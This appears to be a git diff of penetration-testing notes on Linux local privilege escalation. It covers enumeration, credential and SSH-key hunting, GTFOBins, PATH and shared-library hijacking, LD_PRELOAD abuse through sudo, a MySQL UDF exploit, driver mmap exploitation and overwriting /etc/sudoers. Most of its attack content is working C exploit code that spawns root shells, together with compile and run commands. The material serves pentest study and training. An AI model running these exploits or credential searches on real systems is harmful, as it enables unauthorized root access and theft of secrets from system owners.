@@ -1,12 +1,12 @@
 # Linux - Local Privilege Escalation
 
 The following note assumes that a low privilege shell could be obtained on the
-target. Some privilege techniques detailed rely on a fully TTY shell.  
+target. Some privilege techniques detailed rely on a fully TTY shell.
 
 To leverage a shell from a Remote Code Execution (RCE) vulnerability please
 refer to the `[General] Shells` note.
 
-“The more you look, the more you see.”  
+“The more you look, the more you see.”
 ― Pirsig, Robert M., Zen and the Art of Motorcycle Maintenance
 
 ### Enumeration
@@ -29,18 +29,18 @@ refer to the `[General] Shells` note.
 ###### Writable directories
 
 Being able to write files on the system is needed for scripting the enumeration
-process and exploiting kernel vulnerabilities.  
+process and exploiting kernel vulnerabilities.
 
 The following directories are usually writable to all:
 
-```
+```bash
 /dev/shm
 /tmp
 ```
 
 To find directories the current user can write into:
 
-```
+```bash
 find / -perm -2 -type d 2>/dev/null
 find / -type d \( -perm -g+w -or -perm -o+w \) -exec ls -lahd {} \; 2>/dev/null
 ```
@@ -49,7 +49,7 @@ find / -type d \( -perm -g+w -or -perm -o+w \) -exec ls -lahd {} \; 2>/dev/null
 
 Most of the enumeration process detailed below can be automated using scripts.
 To upload the scripts on the target, please refer to the `[General] File
-transfer` note.  
+transfer` note.
 
 Personal preference:
   1. `linux-smart-enumeration.sh` + `LinEnum.sh` + `linux-exploit-suggester.sh`
@@ -63,7 +63,7 @@ enumerate the system configuration using more than 65 checks (OS & kernel
 information, home directories, sudo acces, SUID/GUID files, configuration
 files, etc.).
 
-```
+```bash
 -t	Thorough tests (notably SUID/GUID files)
 -r	Report name
 [-k	Keyword to grep in enumerated configuration files]
@@ -82,7 +82,7 @@ The `linux-exploit-suggester.sh` script require `Bash` to be in version 4.0 or
 higher. The script can be used off the targeted box, by gathering the OS,
 Kernel and installed packages versions.
 
-```
+```bash
 (target box) $ uname -a
 # Get packages list - Refer to the [General] File transfer note to transfer the file
 [Debian / Ubuntu] (target box) $ dpkg -l > <PACKAGE_LIST>
@@ -93,7 +93,7 @@ linux-exploit-suggester.sh --full --uname "<UNAME>" --pkglist-file <DPKGOUT_FILE
 
 Or directly on the targeted box:
 
-```
+```bash
 linux-exploit-suggester.sh --full
 
 linux-exploit-suggester.pl
@@ -105,7 +105,7 @@ vulnerabilities. It uses the `exploit-db` database to evaluate the security of
 packages and search for exploits, so an export of available exploits must be
 provided to the script:
 
-```
+```bash
 # Generate the exploit-db CSV list locally
 python linux-soft-exploit-suggester.py --update
 
@@ -129,10 +129,10 @@ practical to use.
 *Outdated scripts*
 
 The `Linuxprivchecker.py` script enumerates the system configuration and runs
- privilege escalation checks to recommend kernel privilege escalation exploits.  
+ privilege escalation checks to recommend kernel privilege escalation exploits.
 **The linux-exploit-suggester.py is not maintained anymore.**
 
-```
+```bash
 python Linuxprivchecker.py
 ```
 
@@ -142,7 +142,7 @@ python Linuxprivchecker.py
 
 The following commands can be used to display all mounted file systems:
 
-```
+```bash
 # Human readable
 df -aTh
 
@@ -156,7 +156,7 @@ cat /proc/mounts
 Search for clear text passwords stored in files. Use the keyword 'password'
 first and broaden the search if needed by searching for 'pass':
 
-```
+```bash
 # Restrict the search to configuration files
 find / -name "*.conf" -print0 | xargs -0 grep -Hi "password"
 find / -name "*.conf" -print0 | xargs -0 grep -Hi "pass"
@@ -172,7 +172,7 @@ find / -type f -name "*.php" -print0 | xargs -0 grep -Hi "mysql_connect"
 ###### Users home directories content
 
 The users home directories may contain sensible information such as config files
-or history files.  
+or history files.
 The following commands can be used to display the content of the users home
 directories:
 
@@ -195,7 +195,7 @@ cat ~/.php_history
 
 ###### SSH private-keys and configurations
 
-```
+```bash
 # id_rsa, id_dsa, authorized_keys, etc.
 ls -lah ~/.ssh/
 find /home -name "*id_rsa*" -print -exec cat {} 2>/dev/null \;
@@ -208,11 +208,11 @@ ls -lah /etc/ssh/
 ###### Services configuration
 
 The following commands can be used to list the configuration files present on
-the system.  
+the system.
 The files in the `/etc` folder are more likely to be active configurations and
 should be reviewed first.
 
-```
+```bash
 find /etc -name '*.conf' -exec ls -lah {} 2>/dev/null \;
 find / -name '*.conf' -exec ls -lah {} 2>/dev/null \;
 ```
@@ -221,7 +221,7 @@ find / -name '*.conf' -exec ls -lah {} 2>/dev/null \;
 
 To list the hidden files present on the system:
 
-```
+```bash
 find / -name ".*" -type f ! -path "/proc/*" ! -path "/sys/*" -exec ls -lah {} \; 2>/dev/null
 ```
 
@@ -230,7 +230,7 @@ find / -name ".*" -type f ! -path "/proc/*" ! -path "/sys/*" -exec ls -lah {} \;
 The following commands can be used to list the files that are world writeable or
 that do not have a owner:
 
-```
+```bash
 # All world-writable files excluding /proc and /sys
 find / ! -path "*/proc/*" ! -path "/sys/*" -perm -2 -type f -exec ls -lah {} \; 2>/dev/null
 
@@ -242,7 +242,7 @@ find / -xdev \( -nouser -o -nogroup \) -print
 
 The following files and directories may contain interesting information:
 
-```
+```bash
 /var/mail/
 /var/www/
 /var/log/
@@ -264,24 +264,28 @@ find / -newermt "<START-DATE>" ! -newermt '<END-DATE>' 2>/dev/null
 find / -newermt "<START-DATE>" ! -newermt '<END-DATE>' -exec ls -lah {} \; 2>/dev/null
 ```
 
-### SUID/SGID Privileges Escalation
+### Privileges escalation through SUID / SGID binaries
+
+`SUID` / `SGID` binaries are executed, respectively, with the privileges of the
+user or group owner of the file. A number of misconfigurations of `SUID` /
+`SGID` binaries can be leveraged for privilege escalation.
 
 ###### Find SUID/GUID files and directories
 
-The find CLI tool can be used to list the SUID/GUID binaries present on the
-system:
+The `find` utility can be used to list the `SUID` / `GUID` binaries present on
+the local system:
 
-```
-# Files SUID
+```bash
+# Files with SUID set.
 find / -user root -perm -4000 -ls 2>/dev/null
 find / -perm -4000 -type f -exec ls -la {} 2>/dev/null \;
 find / -type f -user root -perm -4000 -exec stat -c "%A %a %n" {} \; 2>/dev/null
 
-# Files SGID
+# Files with SGID set.
 find / -user root -perm -2000 -ls 2>/dev/null
 find / -type f -user root -perm -2000 -exec stat -c "%A %a %n" {} \; 2>/dev/null
 
-# Both
+# Files with both the SUID and SGID set.
 find / -user root -perm -6000 -ls 2>/dev/null
 find / -type f -user root -perm -6000 -exec stat -c "%A %a %n" {} \; 2>/dev/null
 ```
@@ -292,10 +296,10 @@ files enumerated.
 ###### "GTFOBins"
 
 The `GTFOBins` are binaries that can be used to bypass local security
-restrictions and notably escape to shell.  
+restrictions and notably escape to execute commands through a shell.
 
 The following binaries can be exploited to elevate privileges on the
-system if run with the SUID/SGID bit set:
+system if run with the `SUID` / `SGID` bit set:
 
 | | | | | | | | | | |
 |-|-|-|-|-|-|-|-|-|-|
@@ -308,64 +312,245 @@ system if run with the SUID/SGID bit set:
 | rsync | run-parts | scp | sed | setarch | shuf | socat | sort | sqlite3 | start-stop-daemon |
 | stdbuf | strace | tail | tar | taskset | tclsh | tee | telnet | tftp | time |
 | timeout | ul | unexpand | uniq | unshare | vi | vim | watch | watch | wget |
-| xargs | xxd | zip | zsh |  
+| xargs | xxd | zip | zsh |
 
-For the privileges escalation sequences please refer to:
+For a more comprehensive / updated list of `GTFOBins`, and their respective
+privileges escalation sequences, please refer to:
 
 ```
 https://gtfobins.github.io/
-(Source https://github.com/GTFOBins/GTFOBins.github.io)
+(https://github.com/GTFOBins/GTFOBins.github.io)
 ```
 
-###### PATH exploit
+###### Relative binary call and PATH exploit
 
 If a binary with the `SUID` / `SGID` bit set runs another binary with out
 specifying its full path, it can be leveraged to escalate privileges on the
-system.  
-The vulnerability arise because the Linux operating system relies on the
-current user path environment variable to find the binary called and not the
+system. The vulnerability arise because the Linux operating system relies on the
+current user `PATH` environment variable to find the binary called and not the
 path of the owner of the `SUID` / `SGID` binary.
 
-To detect that a `SUID` / `SGID` binary is calling others binaries with out
-specifying their full path, the Linux strings tool can be used:
+Note that this attack primitive is not applicable to binaries executed through
+`sudo`, if the `secure_path` value is set in the `sudoers` file. If set, the
+`PATH` defined in the `PATH` value will indeed be used instead of the `PATH`
+environment variable for the commands executed through `sudo`.
 
-```
+To detect that a `SUID` / `SGID` binary is calling others binaries with out
+specifying their full path, the Linux `strings` utility can be used:
+
+```bash
 strings <SUID_BINARY>
 
-# Example of a vulnerable call
+# Example of a vulnerable call for the "cp" utility.
 cp /etc/shadow /etc/shadow.bak
 ```
 
 The exploit sequence is as follow:
 
-1. Include a writable by the current user folder in the PATH environment
-   variable.  
-   Do not use a folder writable by all as it could be used against the current
-   user and would lower the system security level.  
-   `export PATH=/home/<USERNAME>:$PATH`
+  1. Include a writable by the current user folder in the `PATH` environment
+     variable. Do not use a folder writable by all users as it could be used
+     against the current  user and would lower the system security level.
+     `export PATH=/home/<USERNAME>:$PATH`
 
-2. Create a binary named after the binary called by the SUID/SGID binary in the
-   added folder.   
-   If the arguments used for the call permit it, `bash` or `sh` can be used
-   directly.  
-   If not, the following C code can be used to compile a binary or a shell elf
-   can be used ([General] Shells note):
+  2. Create a binary named after the binary called by the `SUID` / `SGID`
+     binary in the added folder. If the arguments used for the call permit it,
+     `bash` or `sh` can be used directly.
+     If not, the following C code can be used to compile a binary executing
+     `/bin/bash` under the privilege of the user or group owner of the `SUID` /
+     `SGID` binary. Refer to the `[General] Shells` note for reverse shell
+     payloads if needed.
 
-   ```
-   #include <stdlib.h>
-   #include <unistd.h>
+     ```c
+     #include <stdlib.h>
+     #include <unistd.h>
 
-   void main () {
-     setuid(0);
-     system("/bin/bash");
-   }
-   ```
+     void main() {
+       // Bash drops its privilege if the effective uid is not the same as the real uid (if the -p option is not specified for bash).
+       setreuid(geteuid(), geteuid());
+       setregid(getegid(), getegid());
+       system("/bin/bash");
+     }
+     ```
 
-3. Run the vulnerable SUID/SGID binary
+  3. Execute the vulnerable `SUID` / `SGID` binary.
+
+###### Exploit through dynamic / shared library
+
+The search order for the Linux dynamic linker is as follow, as stated in the
+[`ld man page`](https://linux.die.net/man/1/ld):
+  1. Any directories specified by the `-rpath-link` option (only effective at
+     link time).
+
+  2. Any directories specified by the `-rpath` option (only effective at
+     runtime). This option sets the `RPATH` / `DT_RPATH ` or `RUNPATH` /
+     `DT_RUNPATH ` attribute of a binary.
+
+  3. From the content of the `LD_RUN_PATH` environment variable (if neither
+    `-rpath-link` nor `-rpath` options were used at compile time).
+
+  4. From the content of the `LD_LIBRARY_PATH` environment variable.
+
+  5. The default directories, normally `/lib` and `/usr/lib`.
+
+  6. The list of directories configured in the `/etc/ld.so.conf` file.
+
+     The directories searched by the dynamic linker within the
+     `/etc/ld.so.conf` configuration can be listed (in order) using the
+     `ldconfig` utility:
+
+     ```bash
+     ldconfig -v 2>/dev/null | grep -v ^$'\t'
+     ```
+
+Note that for `SUID` / `SGID` binaries, the `LD_RUN_PATH` and `LD_LIBRARY_PATH`
+environment variables cannot be leveraged for privilege escalation, as the
+environment variables of the owner of the file are used (instead of the
+environment variable of the user executing the binary).
+
+*Library exploit code example.*
+
+The following exploit code can be used to compile a shared library executing
+`/bin/bash` as the user or group owner of the `SUID` / `SGID` binary
+(retrieved with `geteuid()`) upon being loaded:
+
+```c
+// Compile using:
+// gcc -o <OUTPUT_LIBRARY>.so -shared -fPIC <CODE_FILE>
+#include <stdlib.h>
+#include <unistd.h>
+
+static void library_main() __attribute__((constructor));
+
+void library_main() {
+  setreuid(geteuid(), geteuid());
+  setregid(getegid(), getegid());
+  system("/bin/bash");
+}
+```
+
+*SUID / SGID binary compiled with the RPATH / RUNPATH option.*
+
+As described in the dynamic library search order above, any shared library
+stored under the directory specified (at compile time) by the `-rpath` option
+will be loaded over libraries from any other locations. If an user has the
+rights to write files in a folder specified in the `RPATH` / `RUNPATH` of a
+`SUID` / `SGID` binary, the binary could be leveraged for privilege escalation.
+
+The `objdump` utility, among others, can be used to determine if a given binary
+has been compiled with the `RPATH` option (`-rpath='<DIRECTORY_PATH>`):
 
 ```
-TODO
-The secure_path value, if set, will be used as PATH environment variable for the commands you run using sudo.
+objdump -x <SUID_BINARY> | grep -i "RPATH\|RUNPATH"
+```
+
+Then the aforementioned exploit code, or the
+[following code](https://www.voidsecurity.in/2012/10/exploit-exercise-rpath-vulnerability.html)
+to exploit more specifically the `libc.so` can be used to execute a shell with
+the privileges of the `SUID` / `SGID` binary owner:
+
+```c
+// Compile using:
+// gcc -fPIC -shared -static-libgcc -Wl,--version-script=version,-Bstatic  libc.c -o libc.so.6
+#include<stdlib.h>
+#define SHELL "/bin/sh"
+
+int __libc_start_main(int (*main) (int, char **, char **), int argc, char ** ubp_av, void (*init) (void), void (*fini) (void), void (*rtld_fini) (void), void (* stack_end)) {
+  char *file = SHELL;
+  char *argv[] = {SHELL,0};
+  setresuid(geteuid(),geteuid(), geteuid());
+  execve(file,argv,0);
+}
+```
+
+*Dynamic / shared library link order hijacking.*
+
+If an user has the right to create or modify files in a directory present in
+the dynamic linker search order, the loading of an arbitrary dynamic / shared
+library by an `SUID` / `SGID` binary (or a binary executed with higher
+privileges through `sudo`) could be induced.
+
+The following scenarios may arise:
+  - rights to overwrite a legitimate library loaded by the targeted
+    `SUID` / `SGID` binary. May impact other programs loading the library and
+    induce system instability.
+  - rights to create a file in a directory taking precedence in the search
+    order over the directory containing the legitimate library. May also impact
+    other programs loading the library and induce system instability.
+  - rights to create a file in a directory in the search order and the targeted
+    `SUID` / `SGID` binary attempts to load a non-existing library.
+
+The `ldd` utility can be used to enumerate the shared libraries imported by a
+binary, while the `strace` utility can be used as a complement to trace the
+eventual libraries loaded at runtime with calls to `dlopen`.
+
+The aforementioned exploit code can, for example, be used to execute a shell
+under the effective user id of root through a `SUID` / `SGID` binary. The
+library should simply be placed in the targeted directory or as a replacement
+of an existing library.
+
+### Privilege escalation through sudo
+
+###### "GTFOBins"
+
+Similarly to `SUID` / `GUID` binaries, any `GTFOBins` program that allows
+arbitrary commands execution can be leveraged for privilege escalation if
+defined to be executable with higher privileges in a `sudo` entry.
+
+`GTFOBins` binaries are referenced on the
+[`gtfobins.github.io`](https://gtfobins.github.io/) website.
+
+###### LD_PRELOAD
+
+If the `LD_PRELOAD` environment variable is set to be kept in the `sudo`
+configuration (`env_keep += LD_PRELOAD` set in the `/etc/sudoers` file), it may
+be possible to obtain code execution under the privileges assumed through
+`sudo`. The `LD_PRELOAD` environment variable can indeed be leveraged to induce
+the utility executed through `sudo` (with hopefully higher privileges) to load
+an arbitrary shared library (`.so`).
+
+The following code example executes `/bin/sh` under the identity of the user
+executing the binary (identified with the `effective uid`, retrieved using
+`geteuid`), and can be leveraged to elevate privilege (if loaded by a binary
+executed under a more privileged user through `sudo`). The `_init` special
+function gets called as the library is first opened.
+
+```c
+#include <stdio.h>
+#include <sys/types.h>
+#include <stdlib.h>
+
+void _init() {
+  unsetenv("LD_PRELOAD");
+  setuid(geteuid());
+  setgid(getegid());
+  system("/bin/sh");
+}
+```
+
+The `sudo` configuration can be retrieved using `sudo -l` (if the current
+user as the required privileges to execute `sudo`). The following example
+output shows a vulnerable `sudo` configuration allowing for privilege
+escalation:
+
+```
+env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, env_reset, env_keep+=LD_PRELOAD
+
+User user1 may run the following commands on aeae955a6e8c:
+(root) NOPASSWD: /usr/bin/openssl
+```
+
+`gcc`, among other compilers, can be used to compile a shared library
+leveraging the exploitation code example above to obtain a shell under the
+privileges assumed through `sudo`.
+
+```bash
+# Compiles the exploitation code as a shared library.
+# The "-nostartfiles" flag is needed to compile shared library making use of the "_init" function.
+gcc -nostartfiles -fPIC -shared -o <LIBRARY>.o <CODE_FILE>.c
+
+# Executes the arbitrary shared library through the targeted binary executed under sudo.
+# The shared library file should be placed in a directory for which the targeted user has access.
+sudo [-u <USERNAME>] LD_PRELOAD=<PATH>/<LIBRARY>.o <TARGETED_SUDO_COMMAND>
 ```
 
 ### Linux groups
@@ -422,7 +607,7 @@ exploited.
 ###### Compilers/languages installed/supported
 
 The supported languages may be leveraged to compile exploit against the
-operating system / kernel and services.  
+operating system / kernel and services.
 
 To find out which compilers / languages can be used:
 
@@ -472,7 +657,7 @@ rpm -q kernel
 
 ###### Installed packages and binaries
 
-The installed programs should be reviewed for potential known vulnerabilities.    
+The installed programs should be reviewed for potential known vulnerabilities.
 To review the installed programs on the target:
 
 ```bash
@@ -492,10 +677,10 @@ ls -lah /usr/sbin
 The enumeration scripts linux-exploit-suggester.sh can be used on or off target,
 if provided with the `uname -a` output and the installed packages list
 (`dpkg -l` or `rpm -qa` command output), to enumerate potential exploits for
-the targeted box.   
+the targeted box.
 
 Refer to the "Enumeration - Enumeration scripts" part above for more information
-and usage guides to the most well known local exploit suggester scripts.  
+and usage guides to the most well known local exploit suggester scripts.
 
 ###### File transfer
 
@@ -539,12 +724,12 @@ file system was mounted with `hidepid=0`.
 
 The current processes can be listed using the `ps` Linux utility:
 
-```
+
 # Depending on the ps utility version either a or e may be used to include processes belonging to other users
 ps aux
 
 # Includes environment variable, verbose
-ps auxeww  
+ps auxeww
 
 ps aux | grep root
 ps ef | grep root
@@ -558,7 +743,7 @@ The information retrieved by the Linux `ps` utility can also be accessed
 manually directly in the process directory:
   - `/proc/<PID>/status`: provides meta-data information such as the process
   umask, running state, PID, PID of the parent process if any, and real and
-  effective UIDs of the process owner.  
+  effective UIDs of the process owner.
   - `/proc/<PID>/cmdline`: contains the complete command line arguments for the
   process, unless the process is a zombie.
   - `/proc/<PID>/environ`: contains the initial environment defined when the
@@ -585,14 +770,14 @@ By default, `pspy` monitors the following directories: `/usr`, `/tmp`, `/etc`,
 `/home`, `/var`, and `/opt`. Additional directories can be specified using the
 `-r` option.
 
-```
+
 # -p: enables printing commands to stdout
 # -f: enables printing file system events to stdout
 # -c: print events in different colors. Red for new processes, green for new Inotify events
 # -i: interval in milliseconds between procfs scans
 
 pspy64 -pfc -i 1000
-```     
+```
 
 ###### MySQL
 
@@ -609,7 +794,7 @@ The `raptor_udf.c` (https://www.exploit-db.com/raw/1518) dynamic library can
 be used to leverage those pre requisites to conduct a local privilege
 escalation.
 
-```
+
 gcc -g -c raptor_udf.c
 gcc -g -shared -W1,-soname,raptor_udf.so -o raptor_udf.so raptor_udf.o -lc
 mysql -u root -p
@@ -629,16 +814,13 @@ mysql> select * from mysql.func;
 # Test the privileges obtained
 mysql> select do_system('id > /tmp/out; chmod 0755 /tmp/out');
 
-# Refer to General - Shells - Binary - Linux C binary for SUID shell for the source C code for the SUID sh binary  
+# Refer to General - Shells - Binary - Linux C binary for SUID shell for the source C code for the SUID sh binary.
 mysql> select do_system('chown root.root /tmp/suid; chmod 4755 /tmp/suid');
 
-mysql> \! sh  
+mysql> \! sh
 sh$ /tmp/suid
 ```
 
-### Sudo
-
-TODO sudo + doas
 
 ### Init.d
 
@@ -723,7 +905,7 @@ operations as well as `mmap` operations, which are used to create a new mapping
 in the virtual address space of the calling process. The main purpose of using
 an `mmap` handler in a driver is to speed up data exchange between kernel space
 and user land, by setting a memory buffer in kernel space accessible from
-user land without the need of additional syscalls.    
+user land without the need of additional syscalls.
 
 A possible issue in drivers `mmap` implementation is the lack of verification of
 process supplied size allocation range. A vulnerable driver could potentially
@@ -734,7 +916,7 @@ A total, or partial, mmaping of the kernel memory could be leveraged to
 elevate the privileges of the calling process by modifying its `cred` struct,
 which contains, among others variables, the process `uids` and `gids`:
 
-```
+```c
 struct cred {
   kuid_t uid; /* real UID of the task */
   kgid_t gid; /* real GID of the task */
@@ -755,7 +937,7 @@ The exploitation process is as follow:
      to check if the current process `uid` was modified
   5. a. if the `uid` of the current process was modified, privileges escalation
         has been achieved and a call to `/bin/sh`, for example, can be used to
-        execute commands as `root`  
+        execute commands as `root`
      b. Otherwise, the previous `uids`/`gids` values are restored and the
         search, repeating from step 3, continues
 
@@ -780,7 +962,7 @@ To conduct `mmap` operations on a device driver, `write` permission on the
 device drive file is needed. The following command can be used to enumerate the
 device drivers files the current user as `write` access to:
 
-```
+
 find /dev -perm -2 -exec ls -ld {} \; 2>/dev/null | grep -v "lrwxrwxrwx"
 ```
 
@@ -852,7 +1034,7 @@ The following result demonstrates that the specific device driver supports
 # Current process memory containing the mmaped memory at 42424000
 cat /proc/<PID>/maps
 [...]
-42424000-132424000 rw-s 00000000 00:06 440    
+42424000-132424000 rw-s 00000000 00:06 440
 ```
 
 ###### Exploitation of a vulnerable `mmap` handler device driver implementation
@@ -957,7 +1139,9 @@ int main(int argc, char * const * argv) {
 
 ### Root write access
 
-/bin/echo "friend    ALL=(ALL:ALL) ALL" > /etc/sudoers
+```
+/bin/echo "<USERNAME>    ALL=(ALL:ALL) ALL" > /etc/sudoers
+```
 
 ### Capabilities
 
@@ -969,5 +1153,13 @@ https://medium.com/@int0x33/day-44-linux-capabilities-privilege-escalation-via-o
 ### References
 
 https://book.hacktricks.xyz/linux-unix/privilege-escalation
+
+https://www.hackingarticles.in/linux-privilege-escalation-using-ld_preload/
+
 https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=299007
+
 https://unix.stackexchange.com/questions/47208/what-is-the-difference-between-kernel-drivers-and-kernel-modules
+
+https://bitvijays.github.io/LFC-BinaryExploitation.html
+
+https://www.boiteaklou.fr/Abusing-Shared-Libraries.html
